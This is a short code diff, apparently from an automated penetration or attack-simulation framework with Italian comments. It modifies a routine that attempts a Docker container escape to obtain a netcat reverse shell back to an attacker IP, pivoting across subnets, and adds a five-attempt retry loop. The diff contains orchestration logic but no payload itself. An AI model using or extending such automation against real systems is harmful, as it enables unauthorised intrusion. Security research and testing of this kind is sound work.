@@ -140,11 +140,13 @@ def main_procedure (attacker_ip, config_file, attack_sequence_file = None, steal
                         #sulla macchina che è in un'altra sottorete e che normalmente non permetterebbe di ottenere una reverse shell.
                         #verrà inoltre rimossa la regola di routing perché non più necessaria una volta che abbiamo una sessione
                         
+                        docker_escape_attack_object = attack_db.create_attack("docker_escape", "0", attacker_ip, C.NETCAT_PORT)
                         mc.prepare(router["id_sess"], C.NETCAT_PORT, LPORT, attacker_ip)
 
                         sess={}
-                        for i in range (0,1):
-                            success =mc.grab_docker_escape_conn()
+                        for i in range (0,5):
+                            #success = mc.grab_docker_escape_conn()
+                            success = mc.attempt_attack(docker_escape_attack_object)
                             if success:
                                 Logger.log(mc, f"connection from netcat established, docker_escape successful", level=Logger.INFO)
                                 sess["escape_sess"]=success
@@ -153,7 +155,7 @@ def main_procedure (attacker_ip, config_file, attack_sequence_file = None, steal
                                 Logger.log(mc, f"can't establish connection from netcat attempt {i} -", level=Logger.ERROR)
 
                         #tentiamo la connessione da netcat in entrata dall'operazione di copia effettuata da un admin
-                        docker_escape_attack_object = attack_db.create_attack("docker_escape", "0", attacker_ip, C.NETCAT_PORT)
+                        
 
                         escape=sess
                         if(escape):
